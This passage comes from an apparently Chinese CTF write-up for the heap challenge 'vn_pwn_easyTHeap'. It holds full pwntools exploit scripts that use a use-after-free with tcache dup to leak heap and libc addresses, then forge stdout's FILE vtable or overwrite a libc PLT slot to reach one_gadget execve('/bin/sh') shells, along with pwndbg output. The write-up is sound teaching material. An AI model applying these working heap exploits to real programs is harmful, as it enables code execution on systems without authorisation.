    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 0</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 1</span>

    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak heap addr</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x260</span>
    li<span class="token punctuation">(</span><span class="token string">'heap_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2 for ajust</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4 teache count as -1, so free chunk will not be teache bin</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak libc</span>
    _IO_str_jumps_offset <span class="token operator">=</span> get_IO_str_jumps_offset<span class="token punctuation">(</span><span class="token punctuation">)</span>

    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x3ebc40</span>
    li<span class="token punctuation">(</span><span class="token string">'libc base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>

    _IO_str_jumps <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> _IO_str_jumps_offset
    _IO_2_1_stdout_ <span class="token operator">=</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>

    li<span class="token punctuation">(</span><span class="token string">'_IO_str_jumps '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>_IO_str_jumps<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span><span class="token punctuation">)</span>
    vtable_jump <span class="token operator">=</span> _IO_str_jumps <span class="token operator">-</span> <span class="token number">0x28</span>
    gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># can't malloc only to modify _IO_2_1_stdout vtable</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># evil address</span>
    md<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 5 for ajust</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 6, malloc to our addr</span>

    p <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad2886</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdout_ <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">7</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdout_ <span class="token operator">+</span> <span class="token number">0x201</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># file num</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000a000000</span><span class="token punctuation">)</span>
    _IO_stdfile_1_lock <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7ff3095508c0</span> <span class="token operator">-</span> <span class="token number">0x7ff309163000</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_stdfile_1_lock<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    _IO_wide_data_1 <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7f2fc336a8c0</span> <span class="token operator">-</span> <span class="token number">0x7f2fc2f7f000</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>_IO_wide_data_1<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vtable_jump<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>

    md<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#db()</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp &amp; 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''</span></code></pre>
<p>参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105404106">https://blog.csdn.net/seaaseesa/article/details/105404106</a></p>
<h2 id="打法2"><a href="#打法2" class="headerlink" title="打法2"></a>打法2</h2><p>评估: </p>
<p>复杂度: 一般  成功率: 一般</p>
<p>上面那个调用太复杂了,来个直接的</p>
<h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><p>tcache, libc中的链接原理(与plt与got差不多)</p>
<h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了<code>malloc</code>和<code>free</code>的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,后面通过还有任意地址分配.将要调用的某个libc中的某个plt函数所对应的跳转地址中的值给改为one_gadget</p>
<h3 id="利用-8"><a href="#利用-8" class="headerlink" title="利用"></a>利用</h3><p>这个获取libc地址的打法与上面一样,就不写了, 主要是获得任意读写地址之后,怎样打one_gadget调用.这个打发就简单得多了,且高效,若所以one_gadget打不通,还可以换其他libc中plt函数来打,打通几率大大提升.</p>
<p>通过调试, 发现在puts中存在一个plt,但是我打了全部one_gadget,就是参数不符合one_gadget,所以在printf中找到一个,如下.ABS*+0xa07f0@plt就是我们的目标了.</p>
<pre><code>   0x7f68f522141f &lt;vfprintf+143&gt;    mov    qword ptr [rbp - 0x438], rax
   0x7f68f5221426 &lt;vfprintf+150&gt;    movups xmmword ptr [rbp - 0x448], xmm0
 ► 0x7f68f522142d &lt;vfprintf+157&gt;    call   *ABS*+0xa07f0@plt &lt;0x7f68f51e7040&gt;
        rdi: 0x55d549dc2ff6 ◂— imul   esp, dword ptr [rax + rdi*2 + 0x3f], 0x6e6f6300 /* &#39;idx?&#39; */
        rsi: 0x25
        rdx: 0x7ffe06e5d790 ◂— 0x3000000008
        rcx: 0x0
</code></pre>
<p>反编译<em>ABS</em>+0xa07f0@plt &lt;0x7f68f51e7040&gt;,获取类似与储存地址的got表地址.0x7f68f55b1048</p>
<pre><code>pwndbg&gt; disass 0x7f68f51e7040
Dump of assembler code for function *ABS*+0xa07f0@plt:
   0x00007f68f51e7040 &lt;+0&gt;:    jmp    QWORD PTR [rip+0x3ca002]        # 0x7f68f55b1048
   0x00007f68f51e7046 &lt;+6&gt;:    push   0x28
   0x00007f68f51e704b &lt;+11&gt;:    jmp    0x7f68f51e6fd0
End of assembler dump.
pwndbg&gt; x /40gx 0x7f68f55b1048 # 修改里面的地址为one_gadget就行.
0x7f68f55b1048:    0x00007f68f5277120    0x00007f68f5345c80
0x7f68f55b1058:    0x00007f68f51e7066    0x00007f68f5347490
0x7f68f55b1088:    0x00007f68f5271970    0x00007f68f5350f90
0x7f68f55b1098:    0x00007f68f5271ea0    0x00007f68f55d0250
...  ...
pwndbg&gt; x /10gx 0x00007f68f5277120
0x7f68f5277120 &lt;__strchrnul_sse2&gt;:    0xff25f889ce6e0f66    0x3dc9600f6600000f
0x7f68f5277130 &lt;__strchrnul_sse2+16&gt;:    0xc9610f6600000fc0    0x4d8f0f00c9700f66
0x7f68f5277140 &lt;__strchrnul_sse2+32&gt;:    0x66076f0ff3000001    0x66e06f0f66dbef0f
0x7f68f5277150 &lt;__strchrnul_sse2+48&gt;:    0x66e3740f66c1740f    0x85c0d70f66c4eb0f
0x7f68f5277160 &lt;__strchrnul_sse2+64&gt;:    0x8d48c0bc0f0d74c0    0x0000441f0fc30704
pwndbg&gt;

</code></pre>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp-2"></a>exp-2</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">'vn_pwn_easyTHeap'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">28200</span>


LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>

<span class="token keyword">def</span> <span class="token function">ad</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">md</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">dp</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 0</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#idx 1</span>

    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak heap addr</span>
    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x260</span>
    li<span class="token punctuation">(</span><span class="token string">'heap_base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 2 for ajust</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 3</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 4 teache count as -1, so free chunk will not be teache bin</span>
    rm<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># leak libc</span>

    dp<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    lib<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x7f\x00\x00'</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x3ebc40</span>
    li<span class="token punctuation">(</span><span class="token string">'libc base '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
    ABS <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">0x7fd855098048</span> <span class="token operator">-</span> <span class="token number">0x7fd854cad000</span><span class="token punctuation">)</span>
    gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0xe569f</span><span class="token punctuation">,</span> <span class="token number">0xe5858</span><span class="token punctuation">,</span> <span class="token number">0xe585f</span><span class="token punctuation">,</span> <span class="token number">0xef863</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">,</span> <span class="token number">0x10a398</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span> lib<span class="token punctuation">.</span>address <span class="token operator">+</span> gadget<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># can't malloc only to modify _IO_2_1_stdout vtable</span>

    md<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ABS<span class="token punctuation">)</span><span class="token punctuation">)</span>

    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 5 for ajust</span>
    li<span class="token punctuation">(</span><span class="token string">'ABS_got '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ABS<span class="token punctuation">)</span><span class="token punctuation">)</span>
    ad<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># idx 6, malloc to our addr</span>

    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#db()</span>
    md<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIB<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp &amp; 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
'''</span></code></pre>
<h2 id="打法3"><a href="#打法3" class="headerlink" title="打法3"></a>打法3</h2><p>评估: </p>
<p>复杂度: 一般  成功率: 高</p>
<p>上面那个两个都没有控制好malloc的次数,多了一个,这个就控制少了一个,所以直接修改realloc_hook和malloc_hook打one_gadget.</p>
<h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><p>tcache管理机制</p>
<h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了malloc 和 free 的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址,且也使该方法打入tcache 管理头部,也就是堆的头部,修改tcahe的数量为7,在释放堆块的时候就不会由tcache bin来管理.这样可以泄漏libc,再次修改该结构,使bin指向malloc - 8处,下次分配直接修改该地址,realloc调参数打one_gadget</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp-3"></a>exp-3</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: I0gan</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile <span class="token operator">=</span> <span class="token string">'vn_pwn_easyTHeap'</span>
libFile <span class="token operator">=</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">28200</span>


LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIB   <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
